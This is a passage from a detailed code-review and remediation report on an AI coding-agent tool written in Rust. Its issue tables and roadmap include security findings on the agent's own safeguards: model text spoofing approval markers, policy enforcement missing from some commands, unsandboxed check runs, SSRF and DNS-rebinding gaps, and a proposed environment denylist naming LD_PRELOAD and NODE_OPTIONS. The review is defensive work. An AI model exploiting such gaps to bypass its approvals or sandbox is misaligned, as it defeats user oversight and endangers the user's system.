| `kod-core/src/budget.rs:103–106` | `remaining * 50 / 100` overflow window on 32-bit → `remaining / 2` |

### kod-config & policy
| Location | Issue → Fix |
|---|---|
| `policy.rs:106–112` | `ToolPolicy.network` never enforced anywhere (placebo security knob; zero consumers) → enforce in `decide()` or remove |
| `policy.rs:554–588` | Invalid glob patterns silently disable **protections** (forbidden lists; `false` is safe only for allow-lists) → validate all patterns at load, warn/error naming tool+pattern |
| `policy.rs:357–412, 512–519` | Path policy only covers args literally named `path`/`file`; pathless calls (execute_command) skip allowlists entirely → per-tool path-arg table from the registry; deny/ask when allowlist set but no path arg |
| `policy.rs:171–176` | `preset_explicit` detected by a crude line scan (false positives on `presets = [...]`) → parse to `toml::Table` and `contains_key("preset")` |
| `policy.rs:16–19, 216` | Docs reference legacy `tools.confirm_writes` that no longer exists; provenance tagged even for defaulted presets → rewrite docs; tag only when actually set |
| `policy.rs:438–457` | `describe()` prints only `mode` — `kod policy show` can't audit globs → render all populated fields |
| `mcp.rs:43–66` | Server names unvalidated; a name containing `.` misroutes `mcp:<server>.<tool>` splitting → validate (reject `.`/`:`/whitespace/empty) with reason |
| `config.rs:306–310, 353–357` | No `~` expansion for `long_term_db_path`/`skills_dir` → shared `expand_tilde` helper (one already exists in TUI completion code) |
| all structs | No unknown-key detection anywhere (typos silently ignored — violates the crate's own "no placebo config" doctrine) → post-parse `toml::Table` diff per section, warn on unknown keys |
| `config.rs:188–242` | Only `[llm]` validated on load; `match_threshold = 70`, capacities 0, `max_agents = 500` accepted silently → per-section `validate()`/`clamp()` with warn-per-adjustment |
| `config.rs:375–385` | No forward-compat guard on `config_version` (newer configs load silently) → warn when `effective_version() > 2` |
| `jev.rs:141–160` | `JevThresholds::clamp` is dead code; NaN/7.0 thresholds reach decision gating → call it in `load_default` |
| `config.rs` (missing) | No `kod config validate` diagnostics API; warnings only via tracing (possibly pre-subscriber) → return `Vec<ConfigWarning>` from load; add CLI verb |
| `profiles.rs:16–65` | `ModelProfile` duplicates `EndpointConfig` with no in-crate conversion; no Anthropic profile; `cloud-openai` has no `api_key_env` → `to_endpoint()` in kod-config |

### Providers
| Location | Issue → Fix |
|---|---|
| `wire.rs:279–285` | Malformed SSE frames silently dropped; multi-line `data:` fields not joined → count/log; error after threshold; join per SSE spec |
| `wire.rs:47` | Silent 4096 default for `max_tokens`; truncation invisible (see stop_reason gap) → require upstream or derive from model; log when defaulting |
| `wire.rs:123,137–152` | Degenerate `unwrap_or_default()` ids; `tool_result` carries no `is_error` → reject locally with a name-bearing error; thread the flag |
| `provider.rs:164–174` (anthropic) | `list_models` hardcoded empty (see H-P8) |
| `provider.rs:429–436, openai:573–580` | `normalize_base_url` normalizes garbage (`api.anthropic.com` → relative-URL error; `/v2` → `/v2/v1`; Azure-style paths break) → parse with `url::Url`; require http(s); error at construction |
| `registry.rs:50–55` | Doc claims model validation `resolve()` doesn't do → validate or fix doc |
| `provider/Cargo.toml:22–25` | `testkit` ships in default builds; its contracts are near-tautological → dev-dependency gating; tighten contracts to scripted determinism |
| `types.rs:66–79` | `response_chunks` drops usage (see H-P10) |
| `wire.rs:262–296` | Per-line allocations + `drain` memmove in the hottest loop; dead stream state fields → slice in place; drop dead fields |

### Tools / web / git
| Location | Issue → Fix |
|---|---|
| `web.rs:471–497` | `html_to_text` entity coverage limited; `<title>` dropped; nesting confusion → acceptable for prose; document |
| `web.rs:172–179` | `spawn_blocking` JoinError → `Ok(vec![])` → DNS check silently skipped → treat join error as refusal |
| `git.rs:197–213` | porcelain-v2 parser mishandles rename (`2 XY …` has an extra score column) and ignores unmerged `u` lines → parse by format spec |
| `git.rs:134, 265` | Read-only `git_status`/`git_diff` declare `GitAccess::Write` (over-broad approvals/audit) → correct the access level |
| `git.rs:32–87` | `run_git` inherits `GIT_DIR`/`GIT_WORK_TREE`/`GIT_CONFIG_*` → strip them |
| `check.rs:530–545` | `DEFAULT_TIMEOUT_SECS` hardcoded (ignores `context.timeout_secs`); check runs unsandboxed (build.rs executes!) → plumb timeout; consider sandboxing |
| `search.rs:136–139` | `search_files` has no large-file cap (doc claims it reuses grep's) → same 8MB check + skipped reporting |
| `tools.rs:1158` | grep `truncated` flags true at exactly-cap even if nothing dropped → only on actual break |
| `tools.rs:729–740` | `list_files` collects the entire walk before truncating to 5000 → bound during iteration |
| `tools.rs:919` | `patch_file` reads whole file with no size cap (unlike read_file's 256KB) → cap |
| `todo.rs:50,93` | Two `TodoTool`s sharing one list keep separate `next_id` → duplicate ids → move counter into shared state |
| `worktree.rs:306` | Silently appends `.kod/` to the user's `.gitignore` (dirties a possibly-tracked file, then can fail the later merge); only recognizes the exact line → use `.git/info/exclude` or `git check-ignore` |
| `worktree.rs:380` | Git timeout documented but never enforced; all git calls sync in async → kill-deadline or `spawn_blocking` |
| `swarm_runner.rs:580` | Per-subtask write-glob assignment **overwrites** instead of unions (comment claims union) → read-modify-write the union |
| `swarm_runner.rs:334` | `completed` keyed by subtask name; failed deps count as completed; duplicate names collide → insert only on Ok; reject duplicates |

### Memory
| Location | Issue → Fix |
|---|---|
| `manager.rs:340–351` + `retrieval.rs:83–99` | Hybrid score non-monotonic at the top-200 semantic cliff (being semi-matched semantically *hurts*) → entries outside the hit set get `Some(0.0)`; or search k = corpus size |
| `embedding.rs:109–146, 204–234` | `embed()` never validates returned count/order against the batch; single 60s timeout, no retry → assert counts (honor OpenAI `index`); one retry with backoff |
| `long_term.rs:36–57` | Concurrent open is a cryptic hard failure; corrupt DB has no quarantine → detect `DatabaseAlreadyOpen` with an actionable message; rename-aside `.corrupt-<ts>` + recreate |
| `long_term.rs:212–217 vs 244–264` | `get_all` silently skips undeserializable rows while `count()` counts them; no schema version → log skipped ids; `meta` table with `schema_version` |
| `long_term.rs:33–51` | redb file created with default perms despite holding extracted user facts → `set_permissions(0o600)` + 0700 dir |
| `engine.rs:7770–7793` + `extract.rs` | Shutdown extraction sends the whole transcript unbounded to the first-chain provider → cap by estimated tokens, walk backwards, record truncation |
| `manager.rs:409, 629` | Stray whitespace runs in log literals (merge artifacts) → collapse |
| `retrieval.rs:136–148` | Recency scorer ignores the `last_retrieved_at_ms` write-back it maintains → score `max(timestamp, last_retrieved)` |
| `vector_index.rs:99–110` | `swap_remove` breaks the documented insertion-order tie-break → `remove(pos)` |
| `stopwords.rs:214–225` | Stemmer overshoots `-est` (`fastest` → `fas`) → consonant guard or drop `-est` |

### Skills / swarm / protocol
| Location | Issue → Fix |
|---|---|
| `skills/parser.rs:52767` | No `deny_unknown_fields` on `SkillMetadata` — typo'd frontmatter silently degrades matching → deny or warn on unknown keys |
| `skills/parser.rs:52704` | Unbounded skill file read; body stored twice → size cap before read (1MB), skip with warning; drop duplicate field |
| `skills/watcher.rs:53205` | Silent event drop on full queue → permanent cache drift, no resync → warn on Full + periodic (60s) rescan backstop |
| `skills/loader.rs:51642–51658` | No debounce: mid-write truncated files parsed and cached → debounce 50–100ms or mtime-stability check |
| `skills/matcher.rs:52248–52293` | Substring scoring: no word boundaries; short tags/triggers over-match; empty query matches all → term-based matching + min lengths |
| `skills/parser.rs:52744–52764, 52800–52858` | Front-matter splitting (`\n---` inside YAML strings; BOM; `----`) and markdown-naive section extraction (headings inside code fences) → line-wise split; fence-aware scan |
| `skills/loader.rs:51449–51501, 51548–51601` | Silent walk errors; nondeterministic intra-dir duplicate winner; a second, divergent hot-reload implementation is dead production code → log errors; warn on dup names; delete the dead loader watcher path |
| `skills/watcher.rs:53226–53244` | `is_running`/`stop()` vestigial; watchers never stopped on shutdown → real teardown on Router or delete |
| `swarm/communication.rs:54131–54134, 54173–54185` | History records delivery before it happens; broadcast aborts mid-loop on first failed recipient → send-then-record; tolerate per-recipient failure |
| `swarm/coordination.rs:54749–54814` | Non-atomic multi-map updates can permanently inflate `agent_load`; `unassign` races `assign` → one `Mutex<CoordinatorState>` or derive load from assignments |
| `swarm/coordination.rs:54650–54671` | `Task.dependencies`/`priority`/`capabilities_required` are decorative (no readers) → wire them (priority queue, dep-aware scheduling) or delete |
| `swarm/agent.rs:53408–53545` | `AgentState::Failed` unreachable (no `fail()`); `ModelConfig::default()` hardcodes `codellama:13b`; `is_timed_out` true for never-started agents → add transition; require config; document semantics |
| `swarm/communication.rs:54198–54207` | `broadcast_lifecycle` hardcodes `TaskStatus::InProgress` for started/finished/failed → take status as a parameter |
| `jev.rs:211,221` (kod-core) | Decision cache grows without bound; expired entries never removed; batch answers type-punned through a `Choice.label` → remove-on-expiry + LRU cap; separate batch variant |

### TUI
| Location | Issue → Fix |
|---|---|
| `app.rs:2039–2071` | Auto-compact drops pinned messages; display-only compaction diverges from engine transcript; fictional re-baseline number → respect pins; document display-only or drop TUI-side compaction |
| `app.rs:2342–2389` | Path completion doesn't re-quote (completing inside quotes yields broken tokens); ignores cursor position → re-quote on space; compute from token under cursor; restore cursor |
| `app.rs:3079–3121` | `/reset` drops pending dialogs without answering the engine (120s hang then deny) → emit deny/cancel for live dialog ids |
| `app.rs:3313–3347` | `/export` markdown broken by embedded fences → length-aware fences |
| `app.rs:836–852` | Slash commands enter the in-memory Up-history (disk persistence deliberately skips them) → skip in-memory too |
| `app.rs:494–496, 2995, 3045` | `/notify`, autocompact-disable, bell-off toggles are unreachable (documented but no dispatch) → wire or remove |
| `app.rs:1065–1076, 3613–3648` | Search rescans the whole transcript per frame; `read_dir` per frame from the render path (path completion evaluated 3–5×/frame) → cache matches per (query, seq); compute candidates on input change |
| `event.rs:331` | crossterm `EventStream` errors silently discarded → log + backoff/exit |
| `event.rs:337–378, 72` (part of H-T keys) | Unmapped keys become phantom space (pinned by a test!) → return `Option<KeyCode>` |
| `keybindings.rs:4 vs 73–78` | Documented `~/.kod/tui_keys.toml` path doesn't exist; HashMap iteration makes override winner nondeterministic; project-local key files rebind from cloned repos → read both paths; BTreeMap; consent |
| `theme.rs:161–168` | `parse_color` byte-slices can panic on multibyte theme.toml (startup!) → `is_ascii()` guard |
| `main_loop.rs:2025, 2043` | (see H-T8) |
| `main_loop.rs:2762, 3500` | `println!` to stdout while in raw mode + alt screen corrupts the TUI → system message or suspend |
| `main_loop.rs:322` | `KOD_TEST_DB=""` → `parent().unwrap()` panics → if-let |
| `main_loop.rs:977–990` | Worktree events carry no agent id; attribution by guesswork → add id to `SwarmEvent::WorktreeCreated` |
| `main_loop.rs:2552` | `/pin` matches turns by content (identical messages collide) → key by turn id |
| `main_loop.rs:1332` | Cancel detection by substring `"cancelled by user"` in provider errors → typed `KodError::Cancelled` |
| `main_loop.rs:1511` + `event.rs` | Blocking commands + bounded channels = backpressure cascade stalls the model stream (120s freeze) → non-blocking commands; coalesce chunk events |
| `ui/completions.rs:77` | Selection index vs candidates mismatch after list shrink → clamp once in `KodApp` |
| `ui/help.rs:77` | Help says search key is `/`; binding is `f` (a sibling test asserts this must not drift!) → fix the row |

### LSP / MCP / ACP / error / types
| Location | Issue → Fix |
|---|---|
| `kod-lsp/client.rs:508` | `vec![0u8; n]` with server-controlled `Content-Length` — no cap (OOM on hostile/buggy server) → cap 32–64MB, stream-read |
| `kod-lsp/client.rs:499` | `Content-Length:` case-sensitive; header lines unbounded → case-insensitive; 16KB cap |
| `kod-lsp/client.rs:282–330` | `u64→u32` position casts truncate (line 4294967297 → 1) → `try_from`/filter |
| `kod-lsp/client.rs:418–431` | Graceful shutdown can block on a full pipe (no write timeout) → 1s timeouts on the sends |
| `kod-lsp/client.rs` (features) | No `didSave`/`didClose`/`$/cancelRequest`/workspace symbols/format; opened map never pruned (server memory growth) → didClose on eviction; cancel on timeout; didSave wired to write tool |
| `kod-mcp/client.rs:95–97` + config | MCP child env inherited + config-additive with no denylist (`LD_PRELOAD`, `NODE_OPTIONS`); project-supplied servers = RCE-by-clone if ever loaded from workspace → filter dangerous keys; trust-gate workspace-provided servers; log exact spawn |
| `kod-mcp/client.rs:302` | Unbounded line length; JSON-RPC batch arrays silently ignored → cap; log-and-skip arrays |
| `kod-mcp/client.rs:145–152` | No protocolVersion/capability negotiation check → compare; check `capabilities.tools` before list/call |
| `kod-mcp/lib.rs` | No `is_alive()`/health signal; caller-responsibility for removal has no contract → expose health + on_disconnect |
| `kod-error/error.rs:110–157` | `rate_limited` discards status/body it accepts; 408 → `ProviderTimeout { timeout_ms: 0 }`; 429 ignores `Retry-After` (incl. HTTP-date); substring `is_retryable` (see H-P3) → keep structured data; parse Retry-After; classify from typed status |
| `kod-error/error.rs` (whole) | String-typed variants; no source chaining; no `From<serde_json/reqwest>`; no `Lsp`/`Mcp` variants; no machine-readable codes/backtrace → `#[source]`/`#[from]`; typed sub-errors; `code()` accessor; backtrace behind flag |
| `kod-types/message.rs:71–88` | `MessageMetadata` fields lack `#[serde(default)]` — older transcripts missing any field fail to parse → default them (contrast `SkillMetadata` which does) |
| `kod-types/tool.rs:137` | `ToolExecution.timestamp: String` breaks the `OffsetDateTime` convention → typed timestamp |
| `kod-types/ids.rs:42–47` | `Display` truncates to 8 hex chars and doesn't round-trip `FromStr` → document as lossy or add short-form parser |
| `kod-types/Cargo.toml` | `compact_str` declared, never used → remove |

### Serve / session / daemon
| Location | Issue → Fix |
|---|---|
| `serve.rs:216,239` | Socket takeover TOCTOU (connect-then-remove race); 0600 set after bind (window in the `~/.kod/run` fallback) → bind-first-then-probe; 0700 parent dir; optional shared-secret first frame |
| `serve.rs` (auth) | UID check itself is sound; no auth-token option for shared-host paranoia → optional token |
| `session_log.rs:208` | Sync flush-per-line in async path (blocking I/O per tool call) → `spawn_blocking` writer or buffered writer with periodic flush |
| `mcp_adapters.rs:167,316` | Dead MCP server never reaped/restarted; `shutdown_all` sequential with no outer timeout → track child-exit, drop dead client so next call respawns; bound shutdown |
| `lsp_tools.rs:173` | `u64→u32` truncation bypasses the 1-based line check → range-check before cast |
| `provider_setup.rs:17,31195` | Stale doc ("Anthropic returns an error today" — false); test mutates `ANTHROPIC_API_KEY` without the env lock (flaky parallel runs) → update doc; take the lock |
| `swarm_adapters.rs:48,155` | Debug-formatted agent identity in user-facing strings; swallowed hub-registration errors → Display impl; log failures once |

---

## 5. Systemic root-cause patterns

Fixing the ~290 individual findings is triage; fixing these ten *patterns* is prevention. Each is ranked by the number of concrete findings it explains.

**S1 — The byte-slicing family (12+ sites, 6 crates).** `&s[..n]` on `String::len()` and `b as char` in byte loops. Panics or mojibake on the first CJK character. Sites: `kod-error:120`, `kod-cli:1447/3817`, `engine.rs:18062`, `web.rs:207-212 + html loop`, `main_loop.rs:1102/1626/2855/2871`, `theme.rs:161`, providers' `floor_char_boundary`. → **One shared `truncate_chars`/`floor_char_boundary` helper in kod-types (a correct one already exists in commands.rs), replace every site, add `#![deny(clippy::string_slice)]` and a non-ASCII fixture test per crate.** This is the highest value-per-hour fix in the report.

**S2 — Doc comments promising behavior the code doesn't have (~15 sites).** "the CLI and TUI always install a PolicyEngine" (false), "project_key … filters" (never consulted), "atomic append" (isn't), "we do enforce a hard cap by killing the child" (doesn't), "the next call re-spawns" (nothing does), "Multi-byte UTF-8 preserves" (corrupts), "least_loaded queue consumed by runner" (only in one degenerate branch), "Replaced per-run by clear_all()" (no caller), `close()` doc copied from `clear()`, "fail-open with a warning" (fail-closed), stale `confirm_writes` docs, "Default `Disabled`" (Auto). In a codebase this comment-dense, stale promises are the primary bug vector — reviewers and future contributors will trust them. → **A "docs truth pass" issue per crate; a CI lint (clippy `missing_docs_in_private_items` is not it, but a review checklist item + assertion tests for each claimed invariant) is.**

**S3 — Blocking I/O inside async (no `spawn_blocking` anywhere it matters).** repomap walks (every prompt), session_log flush-per-line (every tool call), worktree git, hooks, LSP `read_file`, grep/search walks, TUI clipboard, Jev `block_on` in the UI loop, stdin reads in REPLs. → **Audit with `cargo clippy` + a grep for `std::fs::`/`std::process::Command` in `async fn`s; wrap in `spawn_blocking` or switch to `tokio::fs`/`tokio::process`.**

**S4 — In-band string markers as the engine↔consumer protocol.** `\0kod-tool:`, `\0kod-args:`, `\0kod-done:`, `\0kod-approval-batch:`, `\0kod-question:` are parsed by prefix/suffix in four consumers (TUI, daemon, ACP, replay), each with its own partial reimplementation; tool-row matching in the TUI uses three divergent string heuristics (H-T5). Model text can spoof markers (P2 finding). → **A typed `EngineEvent` enum over the chunk channel (`StreamChunk::ToolStart{…}` etc.), with markers as one serialization detail; sanitization at the single choke point.**

**S5 — Check-then-use without pinning (TOCTOU).** Path resolution → later `open` (symlink swap), DNS check → separate connection (rebinding), `.git` RO mount → later RW mount wins, policy path lexically resolved vs tool-canonicalized. → **Pin what you checked: `openat2(RESOLVE_BENEATH)`, reqwest `resolve()` pin, mount-order discipline, one shared path resolver (closes H-S3 and H-R16 together).**

**S6 — Placebo config knobs and silent unknown keys.** `ToolPolicy.network` (never enforced), `memory.context_window` (read by nothing), `enable_semantic_search` (only mirrors `enable_memory`), `watcher.is_running`, `acp.sessions` map, `Task.priority/dependencies`, `ModelConfig::default` model, skills threshold scale mismatch — plus no `deny_unknown_fields`/unknown-key warnings anywhere (typo'd config = silently default). The crate doctrine says "no placebo config" and the routing-key validator implements it beautifully — extend that discipline to fields. → **Per-section `validate()` that warns on unknown keys and dead knobs; delete or enforce every dead knob.**

**S7 — Missing timeout/kill discipline.** Hooks (none), worktree git (documented, absent), LSP initialize (none), ACP writer (none), serve request lines (none), check/git children (future dropped, child lives), MCP `shutdown_all` (unbounded). → **One `run_with_deadline` utility (spawn + `kill_on_drop` + graceful→SIGKILL escalation) used everywhere; a coverage test per site.**

**S8 — Caps applied after full buffering.** `snapshot_before` reads 5MB files to reject them; `list()` parses full snapshot content to list; check/git buffer all output before truncating; `search_files` uncapped; skill files uncapped; session logs slurped. → **`metadata().len()` checks before reads; streaming/capped readers; bounded line protocols (serve/ACP/LSP/MCP all need a line-length cap).**

**S9 — Duplicated bootstrapping and entry-point drift.** Three ~300-line turn-preparation preambles in engine.rs (the `set_current_request` bug is drift made real), ~180-line engine-bootstrap blocks in eight CLI commands (the missing-policy bug is drift made real), two hot-reload implementations in kod-skills, three retry classifiers, three `fnv1a` implementations, two `sanitize_slug`s, near-identical LSP/MCP scaffolding that has already drifted. → **Extract `prepare_turn()`, `engine_from_config()`, one retry path, one slug/fnv module; delete the dead duplicates.**

**S10 — God objects.** `run_tool_calls` ≈1,195 lines (gate/approve/execute/log/checkpoint/render/check all inline — two of the three engine High bugs live in its seams); `KodEngine` has 40 fields (~25 Jev-serving methods); `app.rs` 5,141 lines; `handle_command` ≈2,170 lines / 45 arms; `commands.rs` 7,148 lines. → **Extraction order: (1) `TurnPlan`/`prepare_turn`, (2) `run_tool_calls` → gate/execute/observe/render phases, (3) `JevAdvisor` trait hosting the whole `*_with_jev` family, (4) `TranscriptStore`, (5) TUI `commands.rs` + input/search/completion/persistence modules, (6) CLI command modules.**

---

## 6. Missing features & production gaps

Beyond bugs, these capabilities are missing for a credible v1.0. Ranked by user impact; ✦ = self-acknowledged in README/roadmap.

**Agent-loop resilience**
1. ✦ **Context-window management**: token counting before each request, compaction trigger, capped tool messages (H-E2/E3 are prerequisites).
2. **Session resume from log**: `restore_transcript_from_log(path)` filtering `SessionEntry::ToolCall` back into `ChatMessage`s — after a crash, sessions currently restart with rendered prose only.
3. ✦ **Provider resilience**: per-stream deadline + idle timeout + same-endpoint retry with backoff (existing `retry.rs`), typed cancellation, stop_reason plumbing.
4. **Parallel tool execution** for independent mutating calls (PathLockTable already provides per-path safety); within-round pipelining.
5. **Observability**: `#[instrument]` spans per round/tool/Jev call; currently events only, so a slow turn cannot be broken down in a trace viewer.

**Security posture**
6. **Consent surfaces**: project `.kod/policy.toml` escalation gate (H-S2), project-local skills opt-in (H-S9), workspace-supplied MCP server trust gate.
7. **Env hygiene for subprocesses** (H-S5) and **secret redaction** in `config show/export` (H-S4) + memory pre-store secret scrub.
8. **Web egress policy**: per-hop SSRF checks, DNS pinning, optional domain allowlist knob, size/streaming-to-disk option.
9. **`SECURITY.md`, CODEOWNERS, release checklist**, and a **fuzzing target** for the frame parsers (LSP Content-Length, ACP headers, NDJSON, SSE, diff applier) — the parsers are clean pure functions, ideal fuzz targets, and every one currently has either an unbounded read or a panic path.

**Swarm**
10. ✦ Work-stealing dispatch via `least_loaded_agent` (exists, consulted only degenerately); ✦ per-agent heartbeat (exists but hardcoded 90s, H-R6); pause/resume that actually suspends in-flight work; per-agent cost accounting; coordinator-level approval hook before dispatch; swarm state persistence across restart.

**Memory**
11. TTL/decay for LongTerm, content dedup, vacuum/compaction, `kod memory backup`, pagination, per-tag listing, memory edit command, relevance feedback using the write-back telemetry (H-D4/D5 are prerequisites).

**Interfaces**
12. **Bracketed paste + clipboard paste** (H-T9) — the single most user-visible TUI gap.
13. Mouse click-to-expand/scrollbar-drag; OSC 8 hyperlinks for file paths; theme/pref persistence; tmux passthrough docs.
14. LSP: `didSave`/`didClose`, request cancellation, workspace symbols, formatting. MCP: resources/prompts, cancellation, reconnect policy.
15. **Config UX**: `kod config validate/set/edit` diagnostics API (`Vec<ConfigWarning>`), project-level config layering with documented precedence, high-value env overrides (`KOD_LLM_MODEL` etc.), config hot-reload.
16. **read_file offset/limit** for large files (currently >256KB is unreadable via tools — forces `execute_command` round-trips); multi-edit transaction semantics; `kod worktree gc`.
17. ✦ `kod chat --remote` initial-forward of approval markers to clients that attach after the marker is emitted (the last `--remote` gap).

---

## 7. Documentation drift

Docs are a strength in spirit and a liability in accuracy. Fix list (HIGH items first):

1. **TESTING.md is fiction** — claims "roughly 500 test attributes" with a 353-row table; actual count in dumped `src/` alone is ~1,553 (kod-core 373 vs claimed 79; kod-tui 264 vs 105; kod-provider "0 tests" actually has 42). The workspace-structure section says "12 crates" (it's 15), lists three crates twice, and omits kod-swarm entirely. CLI docs describe 6 subcommands vs the real 22; documents non-existent flags (`chat -t/--temperature`, `-i/--interactive`) and non-existent APIs (`matcher.set_max_results`). Keybindings table inverts Home/End.
2. **ARCHITECTURE.md roadmap is stale** — says the CompletionRequest engine migration and Anthropic `cache_control` are "remaining steps"; both shipped (engine builds `CompletionRequest`; `wire.rs` has 51 tests; CHANGELOG announces both). "Object pooling, string interning" listed under Performance Considerations exist only in the SPEC. kod-lsp/kod-mcp sit under the "LLM Provider Layer" heading; the diagram omits kod-provider-anthropic; the data-flow list skips step 7.
3. **SPEC.md** — fine as an aspirational banner doc, but §3.1 states `fastembed 5.17.4` as a current core dependency (it's absent and *banned* in deny.toml); §6 "Semantic (graph) memory" doesn't exist (`MemoryType` has three variants); §8.3 hash-anchored edits advertised in the executive summary have zero implementation (no blake3 anywhere).
4. **CHANGELOG** — `### Added` empty while features (MCP client, policy engine, daemon, LSP pool) sit under `### Fixed`; a second duplicate `### Fixed` heading mid-release; ≥6 bullets truncated mid-sentence; "Default policy preset is now standard (writes require approval)" is contradicted by P0-1; wrong command name (`kod skills-validate` vs `validate-skills`).
5. **README** — "swarm runner does not consult `least_loaded_agent`" is false (it does, degenerately); clipboard/Windows claims vs actual stubs; test-count table undercounts by ~4×.
6. **ADR-04 / brainstorms** — reference `scripts/spike-adk-model.sh` which is not in the repo; call the dependency "the published `jev` crate" while Cargo.toml says "git dependency" (it's a registry dep — and following the comment would trip deny.toml's `unknown-git = deny`); `~/.kod/jev_cache.json` persistence unimplemented (in-memory only); 36 dangling "design §X.Y" citations point at a design document not committed to the repo.
7. **CONTRIBUTING** — "Rust 1.75+" (needs 1.85); crate list stale (missing 5 crates, names a deleted `kod-provider-ollama`); ~15 CHANGELOG bullet stubs.
8. **`kod skills new` template** vs shipped `skills/examples/*` — the examples are excellent and parse cleanly; the scaffolder's output does not (H-C4).

→ **Regenerate every count from code (`cargo test -- --list`, workspace members), re-verify every default value and flag against clap definitions, and add a CI job that diffs documented subcommands/flags against the clap enum.**

---

## 8. What is genuinely done well

For balance — and because these are the foundations the fixes should preserve:

1. **Lock discipline in the engine is exemplary.** Every shared-state access follows read→clone→drop-before-await; a regression test pins "set_provider not blocked by running generation". Across ~10.7k lines of engine, no guard is held across an await.
2. **Production panic hygiene is rare-grade.** commands.rs: 76 unwrap/expect/panic sites, all but one inside `#[cfg(test)]`; engine.rs: 141 unwraps, 1 in production (guarded). User input goes through `Result` faithfully.
3. **Test culture is a genuine strength and larger than documented** (~1,500+ attributes; property tests for the marker wire protocol, multibyte-truncation regressions, mutating-round serialization, baseline-diff fixtures, characterization tests pinning prompt bytes). The failure modes in this report are concentrated precisely where tests were structurally blind: integration seams between crates, non-ASCII inputs, and cold-start protocol states — not in the unit-tested logic.
4. **redb transaction discipline is textbook**: drop-as-abort everywhere, batched writes, durable commits, all redb I/O on `spawn_blocking` with a starvation regression test.
5. **The approval subsystem is production-grade in shape**: up-front oneshot registration (out-of-order-safe), batch rendering, every decision audit-logged to JSONL before execution, `DenyAlways` session rules with provenance, `/policy forget` UI.
6. **`wire.rs` and `retry.rs` show the house style at its best**: pure-function, exhaustively unit-tested, honest about deferred scope. Adopting the *already-written* retry module fixes a whole High finding (H-P3).
7. **serve.rs security fundamentals**: peer-UID verification before the first byte, 0600 socket, explicit no-TCP stance, single writer task preventing frame interleaving.
8. **Honest-UI discipline**: no fake `$0.00` without pricing data, error rows never hidden by the tool toggle, streaming whitespace doesn't render an empty bubble, `/model` failures name the recovery step — each pinned by a regression test.
9. **Tool-result ergonomics**: every model-facing failure is `Ok(ToolResult::Error)` with the path named and a next action suggested; binary detection returns a hex preview instead of mojibake; grep reports skipped-large-files with a true total.
10. **CI design intent** (provider wire-contract and prompt-golden jobs with written rationale, a real Ollama live job with skip-don't-fail fork policy, PR binary-size gates with documented ceilings) — the execution gaps in H-C5/C6 are fixable without redesigning anything.

---

## 9. Prioritized remediation roadmap

### Sprint 0 — "Trust the fence" (week 1, ~P0 + cheapest High)
1. P0-1: install policy in all 4 commands + `engine_from_config()` helper + policy-presence test (kills S9's CLI half).
2. P0-2: parallel-round denial partition + test.
3. P0-4: hooks via env-var substitution + timeout.
4. S1: shared char-safe truncation helper; replace all 12 sites; `clippy::string_slice = deny`; non-ASCII fixtures.
5. H-C2 (kod run exit code), H-C3 (`-n`), H-C4 (`skills new` indoc), H-C7 (MSRV), H-E4 (`as char`), H-P4/P5 (build fixes).
6. Docs truth pass on TESTING.md/CHANGELOG (H-C5/C6, §7.1/7.4).

### Sprint 1 — Security integrity (week 2)
7. H-S1 replay gate; H-S2 policy escalation consent; H-S3 shared path resolver; H-S5/H-S6 execute_command env + cwd; H-S15 `.git` write deny; H-S14 tempfile.
8. H-S7/H-S8 web SSRF + sandbox enforcement (or documented downgrade); H-S4 secret redaction + atomic config save.
9. H-S9/H-S10/H-S11 skills trust, hot-reload rebuild, threshold validation.

### Sprint 2 — Wire correctness & provider resilience (week 3)
10. H-P1 native OpenAI tool-call wire (or adk upgrade decision); H-P2 byte-safe SSE; H-P3 adopt `retry.rs` everywhere; H-P6 stop_reason/error/cache-usage; H-P7 timeouts; H-P9 tool_result ordering + cache invariant.
11. H-R1..R3 ACP fixes; H-R4 serve caps/spawning/cancel; H-C8 REPL ctrl_c + async stdin.

### Sprint 3 — Data integrity (week 4)
12. P0-3 semantic memory revival + embedding validation (H-… memory table); H-D4 memory dedup/cap/token-cache; H-D5 write-back side table; H-D6 short-term state merge.
13. H-D1/H-D2/H-D3 swarm dispatch/merge/data-loss; H-R5 hub teardown; H-R6 watchdog config; H-R16 glob/kill hardening.
14. H-D7/H-D8 checkpoint id/restore; H-D9 config per-section recovery; H-D10 session-log atomicity + truncation tolerance.
15. H-R7..R9 LSP/MCP lifecycle; H-R10 registry clone-out; H-R11 patch lock; H-R12 kill-on-timeout; H-R13 atomic writes; H-R14 diff fixes; H-R15 spawn_blocking + fingerprint parity.

### Sprint 4 — Performance, TUI, polish (weeks 5–6)
16. H-T1/T2/T3 render pipeline (coalesce + caches); H-T9 bracketed paste; H-T5 typed tool-row ids (S4 first step); H-T6/H-T8 command async + transcript rewind; H-T10..T12.
17. Engine: H-E1..E3 (messages, caps, budget), H-E5..E7, E10..E12; extraction program S9/S10 (`prepare_turn`, `run_tool_calls` phases, `JevAdvisor`).
18. Kill the remaining placebo knobs (S6), add `Vec<ConfigWarning>` config API + `kod config validate`.
19. Fuzzing targets + SECURITY.md + release checklist (§6.9).

### Standing practices (start now, keep forever)
- A "docs truth" CI job (subcommands/flags/defaults vs code).
- Integration tests at *crate seams* (policy→engine, engine→provider wire, engine→TUI marker protocol, loader→router hot reload) — every Critical/High cross-crate bug in this report lives in a seam no unit test crosses.
- Non-ASCII fixture in every string-handling test module.
- One reviewer rule: *a comment claiming a guarantee gets a test asserting it* (S2).

---

*End of review. Findings were produced by 13 independent deep-dive passes (one per slice) over the complete dump, cross-verified across slices, with Critical/High claims re-checked against source before publication. Items marked [NEEDS-VERIFY] (GitHub Actions `secrets`-in-`if` semantics, reqwest `stream` gating, `floor_char_boundary` stabilization, `set_transcript_write_globs` union semantics) should be confirmed against current toolchain/GitHub behavior — they are flagged inline where they appear.*
